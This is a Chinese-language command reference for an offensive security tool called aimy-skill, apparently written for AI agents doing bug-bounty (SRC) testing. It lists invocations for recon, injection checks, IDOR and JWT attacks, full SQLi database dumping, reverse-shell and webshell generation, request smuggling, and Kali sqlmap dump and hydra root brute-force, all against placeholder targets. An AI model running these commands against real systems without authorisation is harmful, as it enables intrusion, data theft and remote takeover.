# aimy-skill 命令实战参考（按 SRC 场景分类）

> 所有命令输出 JSON，AI Agent 可直接解析。全局参数：--timeout --delay --session-file --mode。

## 一、认证与会话（SRC 第一步）

    # 登录并保存会话（form 表单 / api / basic）
    python main.py login --auth-url https://t.com/login --auth-type form \
        --auth-user u --auth-pass p --session-file sess.json

    # 之后所有命令带 --session-file 复用登录态
    python main.py sqlcheck "https://t.com/api?id=1" --session-file sess.json

    # 全局认证参数（一次性）
    python main.py sqlcheck "https://t.com/api?id=1" \
        --auth-type form --auth-url https://t.com/login --auth-user u --auth-pass p

## 二、信息收集与攻击面

    python main.py recon https://t.com --deep          # 指纹+端口+git+目录
    python main.py portscan t.com --ports 80,443,8080
    python main.py dirfuzz https://t.com --max 200     # 目录枚举
    python main.py crawl https://t.com --depth 2 --max-pages 100
    python main.py param-mine https://t.com            # 参数挖掘
    python main.py waf https://t.com                   # WAF 识别
    python main.py list                                # 列出全部命令

## 三、注入检测（核心）

    # SQL 注入（自动 error/布尔/时间/union 四类 + WAF 指纹）
    python main.py sqlcheck "https://t.com/api?id=1" --session-file sess.json

    # XSS（反射 + 存储 + DOM + 浏览器验证）
    python main.py xsscheck "https://t.com/search?q=test"
    python main.py xss-validate "https://t.com/search?q=test"

    # 其他注入
    python main.py cmdi "https://t.com/ping?host=1.1.1.1"
    python main.py ssti "https://t.com/hello?name=test"
    python main.py ssrf "https://t.com/fetch?url=http://x"
    python main.py lfi "https://t.com/download?file=a.txt"
    python main.py nosqli "https://t.com/login" --session-file sess.json
    python main.py xxe "https://t.com/api" --param id

    # 深度/高级
    python main.py sqli-blind "https://t.com/api?id=1"    # 盲注利用
    python main.py sqli-oob "https://t.com/api?id=1"      # OOB 通道
    python main.py graphql https://t.com/api/graphql      # GraphQL
    python main.py graphql-abuse https://t.com/api/graphql
    python main.py verify "https://t.com/api?id=1" --vuln-type sqli  # 交叉验证

## 四、越权与认证绕过

    # IDOR 水平越权（SRC 最高频）
    python main.py idor "https://t.com/api/order?id={id}" \
        --my-id 1001 --other-id 1002 --session-file a.json --session-file-b b.json
    # 未授权访问
    python main.py idor "https://t.com/admin/api/users" --no-auth
    # POST JSON body 越权
    python main.py idor "https://t.com/api/order" --my-id A1 --other-id B2 \
        --method POST --json-param userId --session-file a.json

    python main.py auth-bypass "https://t.com/admin"      # 认证绕过(路径/头/方法)
    python main.py jwt "https://t.com/api" --param token  # JWT 检测
    python main.py jwt-attack "https://t.com/api" --token <jwt>  # 算法混淆/弱密钥
    python main.py cors "https://t.com/api"               # CORS
    python main.py csrf "https://t.com/form"              # CSRF

## 五、数据提取（SQLi 命中后）

    # 一条命令：列数→表→列→行 全链 dump
    python main.py sqli-weaponize "https://t.com/api?id=1" --session-file sess.json
    # 结果含 union_database / union_tables / table_columns / table_rows

    # 二阶注入（存储型 SQLi）
    python main.py sqli-second-order "https://t.com/" --param username --session-file sess.json

    # SSRF 云元数据/文件读取
    python main.py ssrf-pwn "https://t.com/fetch?url=http://x"

## 六、武器化与利用

    python main.py reverse-shell --lhost 1.2.3.4 --lport 4444   # 反弹 shell 生成
    python main.py webshell --type php_cmd --encode b64          # webshell 生成
    python main.py deser-weaponize --param data                  # 反序列化 payload
    python main.py smuggler "https://t.com" --exploit            # 请求走私
    python main.py chain "https://t.com/api?id=1"                # 利用链

## 七、自动化流程

    python main.py deepscan https://t.com --session default      # 深度扫描
    python main.py autohunt https://t.com --high-value           # 自动狩猎
    python main.py auto https://t.com --save-report reports/     # 全自动 + 报告落盘

## 八、报告

    # 检测结果转 SRC 可提交报告（14 类漏洞模板）
    python -c "
    from tools.src_report import src_report, src_report_markdown
    f = {'type': 'boolean', 'url': 'https://t.com/api?id=1', 'param': 'id',
         'vector': \"1 AND 1=1\", 'evidence': ['diff=200']}
    print(src_report_markdown(src_report(f)))
    "

## 九、Kali 集成（可选）

    python main.py kali exec "nmap -sV t.com"
    python main.py kali sqlmap "https://t.com/api?id=1" --dump
    python main.py kali nuclei https://t.com --severity high, critical 2>&1 | Out-Null
    python main.py kali hydra ssh://t.com --user root
    # 需要 --kali-host 或 --kali-local 配置
